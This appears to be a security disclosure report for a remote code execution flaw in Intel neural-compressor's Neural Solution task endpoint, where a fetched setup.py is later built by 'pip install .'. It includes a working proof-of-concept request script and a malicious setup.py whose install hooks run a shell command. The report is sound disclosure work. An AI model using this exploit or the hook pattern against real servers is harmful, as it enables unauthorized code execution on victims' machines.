## Description

`intel / neural-compressor`'s `Neural Solution` -> `@app.post("/task/submit/")` remote endpoint allows user to submit `Task` for`optimization tasks`. `Task.requirements` as requirement installation. As defined in `neural_solution/frontend/utility.py` -> `_parse_cmd`, the task execution flow of the program goes from `self.prepare_task(task)` -> `self.prepare_env(task)`, which in `prepare_task` the `Task` have the specified URL fetched and the working-directory switched to the fetched directory. Furthermore, the Pip dependency will be downloaded in `self.prepare_env(task)` later than `self.prepare_task(task)`. This logic-based flaw in `intel / neural-compressor` allow attacker to firstly upload an `setup.py` to the working directory that will be switched, then furthermore specific installing `Task.requirements` to `'.'` _(currently directory)_, resulting the `pip install` installer to install uploaded malicious `setup.py` utilizing the `pip Installation Injection` vulnerability, resulting injected payload to be **implicitly executed**.

## Source-To-Sink

#### `neural-compressor/neural_solution/frontend/fastapi/main_server.py` -> `@app.post("/task/submit/")`

`neural-compressor/neural_solution/frontend/fastapi/main_server.py` -> `@app.post("/task/submit/")` defined the remote endpoint for `Neural Solution` Task Management, within this endpoint, user can specify their model and param for optimization in `Neural Solution`. Here, we can parsed in our `script_url` for refinement and `requirements` for requirement installation

```python
@app.post("/task/submit/")
async def submit_task(task: Task):
    """Submit task.

    Args:
        task (Task): _description_
        Fields:
            task_id: The task id
            arguments: The task command
            workers: The requested resource unit number
            status: The status of the task: pending/running/done
            result: The result of the task, which is only value-assigned when the task is done

    Returns:
        json: status , id of task and messages.
    """
    if not is_valid_task(task.dict()):
        raise HTTPException(status_code=422, detail="Invalid task")

    msg = "Task submitted successfully"
    status = "successfully"
    # search the current
    db_path = get_db_path(config.workspace)

    if os.path.isfile(db_path):
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        task_id = str(uuid.uuid4()).replace("-", "")
        sql = (
            r"insert into task(id, script_url, optimized, arguments, approach, requirements, workers, status)"
            + r" values ('{}', '{}', {}, '{}', '{}', '{}', {}, 'pending')".format(
                task_id,
                task.script_url,
                task.optimized,
                list_to_string(task.arguments),
                task.approach,
                list_to_string(task.requirements),
                task.workers,
            )
        )
        cursor.execute(sql)
        conn.commit()

```

#### `neural_solution/backend/scheduler.py` -> `prepare_env(task)`

As our `Task.requirements` being parsed into the remote endpoint, `neural_solution/backend/scheduler.py` defined the actual `Neural Solution Task` execution flow, which the `prepare_env(task)` prepares the `conda` installation related operations for the refinement of the passed script using `mpirun`. the requirements are installed as `requirement = task.requirement.split(" ")` -> `missing_packages = set(requirement) - set(installed_packages) - set(installed_packages_version)` -> `if not missing_packages:` -> `conda_env = env_name` -> `if conda_env is None:` -> `f" && conda activate {conda_env} && pip install {task.requirement.replace('=','==')}"`

```python
 def prepare_env(self, task: Task):
        """Check and create a conda environment.

        If the required packages are not installed in the conda environment,
        create a new conda environment and install the required packages.

        Args:
            task (Task): task
        """
        # Define the prefix of the conda environment name
        env_prefix = self.conda_env_name
        requirement = task.requirement.split(" ")
        # Skip check when requirement is empty.
        if requirement == [""]:
            return env_prefix
        # Construct the command to list all the conda environments
        cmd = "conda env list"
        output = subprocess.getoutput(cmd)
        # Parse the output to get a list of conda environment names
        env_list = [line.strip().split()[0] for line in output.splitlines()[2:]]
        conda_env = None
        for env_name in env_list:
            # Only check the conda environments that start with the specified prefix
            if env_name.startswith(env_prefix):
                conda_bash_cmd = f"source {CONDA_SOURCE_PATH}"
                cmd = f"{conda_bash_cmd} && conda activate {env_name} && conda list"
                output = subprocess.getoutput(cmd)
                # Parse the output to get a list of installed package names
                installed_packages = [line.split()[0] for line in output.splitlines()[2:]]
                installed_packages_version = [
                    line.split()[0] + "=" + line.split()[1] for line in output.splitlines()[2:]
                ]
                missing_packages = set(requirement) - set(installed_packages) - set(installed_packages_version)
                if not missing_packages:
                    conda_env = env_name
                    break
        if conda_env is None:
            # Construct the command to create a new conda environment and install the required packages
            from datetime import datetime

            now = datetime.now()
            suffix = now.strftime("%Y%m%d-%H%M%S")
            conda_env = f"{env_prefix}_{suffix}"
            # Construct the name of the new conda environment
            cmd = (
                f"source {CONDA_SOURCE_PATH} && conda create -n {conda_env} --clone {env_prefix}"
                f" && conda activate {conda_env} && pip install {task.requirement.replace('=','==')}"
            )
            p = subprocess.Popen(cmd, shell=True)  # nosec
            logger.info(f"[Scheduler] Creating new environment {conda_env} start.")
            p.wait()
            logger.info(f"[Scheduler] Creating new environment {conda_env} end.")
        return conda_env
```

#### `neural_solution/backend/scheduler.py` -> `prepare_task(self, task: Task):`

For the `neural_solution/backend/scheduler.py` -> `prepare_task(self, task: Task):`, it firstly built `self.task_path` as `build_workspace(path=get_task_workspace(self.config.workspace), task_id=task.task_id)`, which furthermore fetched the refinement required script via `subprocess.check_call(["wget", "-P", self.task_path, task_url])`, downloaded in the `script_path` the copied into `os.path.abspath(self.task_path)`; then switch to `self.task_path` as `full_cmd = """cd {}\n{}""".format(self.task_path, neural_coder_cmd)` (here the `neural_coder_cmd` -> `"python -m neural_coder --enable --approach` + `task.approach`)

```python
    def prepare_task(self, task: Task):
        """Prepare workspace and download run_task.py for task.

        Args:
            task (Task): task
        """
        self.task_path = build_workspace(path=get_task_workspace(self.config.workspace), task_id=task.task_id)
        logger.info(f"****TASK PATH: {self.task_path}")
        if is_remote_url(task.script_url):
            task_url = task.script_url.replace("github.com", "raw.githubusercontent.com").replace("blob", "")
            try:
                subprocess.check_call(["wget", "-P", self.task_path, task_url])
            except subprocess.CalledProcessError as e:
                logger.info("Failed: {}".format(e.cmd))
        else:
            # Assuming the file is uploaded in directory examples
            example_path = os.path.abspath(os.path.join(self.upload_path, task.script_url))
            # only one python file
            script_path = glob.glob(os.path.join(example_path, "*.py"))[0]
            # script_path = glob.glob(os.path.join(example_path, f'*{extension}'))[0]
            self.script_name = script_path.split("/")[-1]
            shutil.copy(script_path, os.path.abspath(self.task_path))
            task.arguments = task.arguments.replace("=dataset", "=" + os.path.join(example_path, "dataset")).replace(
                "=model", "=" + os.path.join(example_path, "model")
            )
        if not task.optimized:
            # Generate quantization code with Neural Coder API
            neural_coder_cmd = ["python -m neural_coder --enable --approach"]
            # for users to define approach: "static", "static_ipex", "dynamic", "auto"
            approach = task.approach
            neural_coder_cmd.append(approach)
            if is_remote_url(task.script_url):
                self.script_name = task.script_url.split("/")[-1]
            neural_coder_cmd.append(self.script_name)
            neural_coder_cmd = " ".join(neural_coder_cmd)
            full_cmd = """cd {}\n{}""".format(self.task_path, neural_coder_cmd)
            p = subprocess.Popen(full_cmd, shell=True)  # nosec
            logger.info("[Neural Coder] Generating optimized code start.")
            p.wait()
            logger.info("[Neural Coder] Generating optimized code end.")
```

#### `neural_solution/backend/scheduler.py` -> `_parse_cmd`

Previous mentioned two setup stage function look very harmless. **However, the logic flaw of executional flow leads to the `Remote-Code Execution`**; defined the backend task execution flow taking a look in `_parse_cmd`, we can see the logic how two setup stage function is called:

```python
    def _parse_cmd(self, task: Task, resource):
        self.prepare_task(task)
        conda_env = self.prepare_env(task)
```

Here `Neural Solution` firstly `prepare_task` then `prepare_env`, which is the **reverse order of the introduction of these two classes**, this allows the `pip installation stage` (`prepare_env`) happened later then the `prepare_task` which fetched the refinement file.

## Exploitation

Then, as the file `fetched` before `pip installation stage`, with we specified `Task.script_url` for refinement and `Task.requirements` for requirement installation,meaning that we can firstly upload an `setup.py` to the working directory that will be switched, then furthermore specific installing `Task.requirements` to `'.'` _(currently directory)_, resulting the `pip install` installer to install uploaded malicious `setup.py` utilizing the `pip Installation Injection` vulnerability, resulting injected payload to be implicitly executed.

## `poc.py`

```python
import requests
import json

def exploit(
    url = "http://localhost:8000"
):
    session = requests.Session()
    session.trust_env = False

        # self.prepare_task(task)
        # conda_env = self.prepare_env(task)

    malicious_task = {
        "script_url": "https://github.com/retr0reg/retr0reg/blob/main/setup.py",
        "optimized": "False",
        "arguments": [
            ""
        ],
        "approach": 'static',
        
        # f" && conda activate {conda_env} && pip install {task.requirement.replace('=','==')}"
        
        "requirements": ["."],
        "workers": 1,
    }
    
    print(f"[*] Host = {url}\n")

    print("[!] Request: /task/submit/")
    response = session.post(url+'/task/submit/', data=json.dumps(malicious_task), headers={"Content-Type": "application/json"})
    print(response.content)
    
exploit()
```

### Flow

1. 1: We fetch our `setup.py` as the `Task.script_url`, this script looks like this
    
    ```python
    # setup.py
    from setuptools import setup, find_packages
    from setuptools.command.install import install
    from setuptools.command.egg_info import egg_info
    
    def RunCommand():
     import os;os.system("touch /tmp/retr0reg-pip-carepackage")
    
    class RunEggInfoCommand(egg_info):
        def run(self):
            RunCommand()
            egg_info.run(self)
    
    
    class RunInstallCommand(install):
        def run(self):
            RunCommand()
            install.run(self)
    
    setup(
        name = "retr0reg_pip_carepackage",
        version = "1.1.3",
        license = "MIT",
        packages=RunCommand(),
        cmdclass={
            'install' : RunInstallCommand,
            'egg_info': RunEggInfoCommand
        },
    )
    ```
    
    as how `pip package compiling` works, the `RunEggInfoCommand`and `RunInstallCommand` for the `setup` of this package, thus we constructed a fake pip setup script for requirement installations (As noticed, the `setup.py` will not be implement with remote package downloading such as via `pypi.com`, but only with `local installation` with `pip install .`
    
2. 2: We pass this malicious `setup.py` as `Task.script_url`, which will be parsed at `prepare_task` as the refinement script,
    
    which will be fetched via `wget` then switched to the fetched directory `self.task_path` as previously mentioned
    
    ```python
            self.task_path = build_workspace(path=get_task_workspace(self.config.workspace), task_id=task.task_id)
            logger.info(f"****TASK PATH: {self.task_path}")
            if is_remote_url(task.script_url):
                task_url = task.script_url.replace("github.com", "raw.githubusercontent.com").replace("blob", "")
                try:
                    subprocess.check_call(["wget", "-P", self.task_path, task_url])
            
            # Codes.....
            full_cmd = """cd {}\n{}""".format(self.task_path, neural_coder_cmd)
            p = subprocess.Popen(full_cmd, shell=True)
            
    ```
    
3. 3: The `conda_env = self.prepare_env(task)` will be subsequentially triggered. Nevertheless, **as we parsed `'.'` (`current directory`) in the `Task.requirements`, `pip` of the `conda` environment will be actually installing (compiling) the local directory**
    
    ```python
             
        def prepare_env(self, task: Task):
            """Check and create a conda environment.
    
            If the required packages are not installed in the conda environment,
            create a new conda environment and install the required packages.
    
            Args:
                task (Task): task
            """
            # Define the prefix of the conda environment name
            env_prefix = self.conda_env_name
            requirement = task.requirement.split(" ")
            # Skip check when requirement is empty.
            if requirement == [""]:
                return env_prefix
       
         if conda_env is None:
                # Construct the command to create a new conda environment and install the required packages
                from datetime import datetime
    
                # Codes ....
                
                # Construct the name of the new conda environment
                cmd = (
                    f"source {CONDA_SOURCE_PATH} && conda create -n {conda_env} --clone {env_prefix}"
                    f" && conda activate {conda_env} && pip install {task.requirement.replace('=','==')}"
    ```
    
4. As the `setup.py` defined, the pre-coded `cmdclass={ 'install' : RunInstallCommand, 'egg_info': RunEggInfoCommand },` will trigger the `import os;os.system("touch /tmp/retr0reg-pip-carepackage")`, now getting our Remote-Code Execution with the `PIP installation` -> `setup.py`
    

# Impact

Remote-Code Execution